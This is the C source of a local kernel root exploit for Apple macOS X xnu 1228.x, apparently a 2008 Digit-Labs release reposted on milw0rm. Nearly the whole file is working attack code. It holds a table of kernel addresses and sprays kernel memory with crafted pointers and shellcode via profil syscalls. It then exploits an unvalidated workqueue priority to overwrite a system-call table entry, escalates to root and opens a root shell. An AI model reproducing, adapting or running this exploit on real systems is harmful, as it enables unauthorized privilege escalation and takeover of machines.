/* xnu-workq-v2-64.c
 *
 * Copyright (c) 2008 by <mu-b@digit-labs.org>
 *
 * Apple MACOS X xnu <= 1228.9.59 local kernel root exploit
 * by mu-b - Sat 16 Feb 2008
 *
 * - Tested on: Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
 *              Apple MACOS X 10.5.2 (xnu-1228.3.13~1/RELEASE_I386)
 *
 * workqueue_additem and workqueue_removeitem do no validate the
 * user defineable parameter prio.
 *                                    (bsd/kern/pthread_synch.c)
 *
 * Note: this requires quite a large amount of memory for the heap spray!
 *
 * Compile: gcc -Wall -O0 -m64 xnu-workq-v2-64.c -o xnu-workq-v2-64
 *                  (compile 64-bit ONLY)
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <fcntl.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>

/* profil defines     */
#define PROFIL_ITEM_SIZE      64
#define PROFIL_BLK_SIZE       65536
#define PROFIL_BLK_NUM        84

/* workq defines      */
#define WQOPS_QUEUE_ADD       1
#define WORKQUEUE_PRIOS_MIN   -2
#define WORKQUEUE_PRIOS_MAX   2

/* overwrite defines  */
#define WL_LIST_BASE          0x05600000
#define WL_LIST_ACCESS        0x09000060

#define WILIST_PTR            0x10000044
#define WIITEM_PTR            0x18000044

struct workq_item {
  void *_pad[2];
  void *func;
  void *__pad[2];
};

struct workq_ops_args {
  int options;
  void *item;
  int prio;
};

static struct targets {
  const char *name;
  int auth_addr;   /* kauth_cred_get            */
  int sys_addr;    /* sysent, &__mac_getfsstat  */
} targets_t[] = {
  { "root:xnu-1228~1/RELEASE_I386", 0x0035F492, 0x00503F90 + 4 },
  { "root:xnu-1228.0.2~1/RELEASE_I386", 0x0035F429, 0x00504F90 + 4 },
  { "root:xnu-1228.3.13~1/RELEASE_I386", 0x0036094C, 0x00506F90 + 4 },
  { NULL, 0, 0 },
};

void
_dummy (void)
{
  while (1);
}

int
main (int argc, char **argv)
{
  struct workq_ops_args req;
  struct workq_item workq;
  struct utsname p_uname;
  int auth_addr, sys_addr;
  char buf[1024], *ptr;
  int id, i, n;

  printf ("Apple MACOS X xnu <= 1228.3.13 local kernel root/DoS exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  auth_addr = 0;
  sys_addr = 0;
  uname (&p_uname);

  ptr = strrchr (p_uname.version, ' ') + 1;
  for (i = 0; targets_t[i].name; i++)
    if (strcmp (targets_t[i].name, ptr) == 0)
      {
        auth_addr = targets_t[i].auth_addr;
        sys_addr = targets_t[i].sys_addr;
        break;
      }

  if (targets_t[i].name == NULL)
    {
      fprintf (stderr, "%s: unsupported xnu version found :( [%s]\n",
               argv[0], ptr);
      exit (EXIT_FAILURE);
    }

  printf ("* opening work queue, pid: %d...", getpid ());
  if ((n = syscall (SYS_workq_open, NULL)) < 0)
    {
      fprintf (stderr, "\n%s: syscall [SYS_workq_open]: failed: %d\n",
               argv[0], n);
      exit (EXIT_FAILURE);
    }
  printf ("done\n\n");

  printf ("* beginning spraying...\n");
  printf ("** opening profil, pid: %d...", getpid ());
  if ((n = syscall (SYS_profil, buf, sizeof buf, 0, 1)) < 0)
    {
      fprintf (stderr, "\n%s: syscall [SYS_profil]: failed: %d\n",
               argv[0], n);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("* filling %d-bytes of kernel memory...\n", PROFIL_BLK_NUM * PROFIL_BLK_SIZE * PROFIL_ITEM_SIZE);

  printf ("** filling workitemlist pointers...\n");
  fflush (stdout);

  for (i = 0; i < (PROFIL_BLK_SIZE * PROFIL_BLK_NUM) / 3; i++)
    {
      void *arg1, *arg2, *arg3;

      arg1 = (void *) ((((long) WILIST_PTR) << 32) | WILIST_PTR);
      arg2 = (void *) 0xE4E5E6E7E0E1E2E3;
      arg3 = (void *) 0xF4F5F6F7F0F1F2F3;

      n = syscall (SYS_add_profil, arg1, arg2, arg3, 0x0);
      if (n < 0)
        {
          fprintf (stderr, "%s: syscall [SYS_add_profil]: failed: %d\n",
                   argv[0], n);
          exit (EXIT_FAILURE);
        }

      if (!(i % 32))
        printf ("** %d-bytes filled\r",  i * 64);
    }
  printf ("\n** done\n\n");

  printf ("** filling %d workitem elements...\n", (PROFIL_BLK_SIZE * PROFIL_BLK_NUM) / 3);
  fflush (stdout);

  for (i = 0; i < (PROFIL_BLK_SIZE * PROFIL_BLK_NUM) / 3; i++)
    {
      void *arg1, *arg2, *arg3;

            /*                   0X4(edx)              (edx)  */
            /*                     eax                  ecx   */
      arg1 = (void *) ((((long) sys_addr) << 32) | WIITEM_PTR);
      arg2 = (void *) 0xDEADBE03DEADBE02;
      arg3 = (void *) 0xDEADBE05DEADBE04;

      n = syscall (SYS_add_profil, arg1, arg2, arg3, 0x0);
      if (n < 0)
        {
          fprintf (stderr, "%s: syscall [SYS_add_profil]: failed: %d\n",
                   argv[0], n);
          exit (EXIT_FAILURE);
        }

      if (!(i % 32))
        printf ("** %d-bytes filled\r",  i * 64);
    }
  printf ("\n** done\n\n");

  printf ("** filling %d next workitem elements...\n", (PROFIL_BLK_SIZE * PROFIL_BLK_NUM) / 3);
  fflush (stdout);

  for (i = 0; i < (PROFIL_BLK_SIZE * PROFIL_BLK_NUM) / 3; i++)
    {
      void *arg1, *arg2, *arg3;

      arg1 = (void *) 0x0000000004EB9090;
      arg2 = (void *) ((((long) auth_addr) << 32) | 0xB8E58955);
      arg3 = (void *) 0xC9105089D231D0FF;

      n = syscall (SYS_add_profil, arg1, arg2, arg3, 0xCCC3);
      if (n < 0)
        {
          fprintf (stderr, "%s: syscall [SYS_add_profil]: failed: %d\n",
                   argv[0], n);
          exit (EXIT_FAILURE);
        }

      if (!(i % 32))
        printf ("** %d-bytes filled\r",  i * 64);
    }
  printf ("\n** done\n* done\n\n");

  printf ("* adding dummy workq to lists...\n");
  memset (&workq, 0, sizeof workq);
  workq._pad[0] = buf;
  workq._pad[1] = buf;
  workq.func = &_dummy;
  workq.__pad[0] = buf;
  workq.__pad[1] = buf;

  for (i = WORKQUEUE_PRIOS_MIN; i <= WORKQUEUE_PRIOS_MAX; i++)
    {
      memset (&req, 0, sizeof req);
      req.options = WQOPS_QUEUE_ADD;
      req.item = &workq;
      req.prio = i;

      printf ("** adding dummy worklist item: %d...", i);
      if ((n = syscall (SYS_workq_ops, req.options, req.item, req.prio)) < 0)
        {
          fprintf (stderr, "\n%s: syscall [SYS_workq_ops]: failed: %d\n",
                   argv[0], n);
          exit (EXIT_FAILURE);
        }
      printf ("done\n");
    }
  printf ("* done\n\n");
  sleep (1);

  memset (&req, 0, sizeof req);
  req.options = WQOPS_QUEUE_ADD;
  req.item = (void *) 0xCAFEBABE;
  req.prio = (WL_LIST_ACCESS - WL_LIST_BASE) / 16;

  printf ("* overwriting @0x%08X with 0x%08X\n", sys_addr, WIITEM_PTR);
  printf ("** req.prio: 0x%08X, access @~0x%08X [with offset: 0x%08X]\n",
          req.prio, WL_LIST_ACCESS, WL_LIST_BASE);
  sleep (1);

  if ((n = syscall (SYS_workq_ops, req.options, req.item, req.prio)) < 0)
    {
      fprintf (stderr, "%s: syscall [SYS_workq_ops]: failed: %d\n",
               argv[0], n);
      exit (EXIT_FAILURE);
    }
  printf ("* done\n\n");

  printf ("* jumping....");
  sleep (1);

  if ((n = syscall (SYS___mac_getfsstat, 0, 0, 0, 0, 0)) == 0)
    {
      fprintf (stderr, "\n%s: syscall [SYS___mac_getfsstat]: failed: %d\n",
               argv[0], n);
      exit (EXIT_FAILURE);
    }
  printf ("done\n\n");

  id = getuid ();
  printf ("* getuid(): %d\n", id);
  if (id == 0)
    {
      printf ("+Wh00t\n\n");

      /* exec shell, for some reason execve doesn't work!?$! */
      system ("/bin/bash");
    }
  else
    fprintf (stderr, "%s: failed to obtain root :(\n", argv[0]);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2009-06-08]
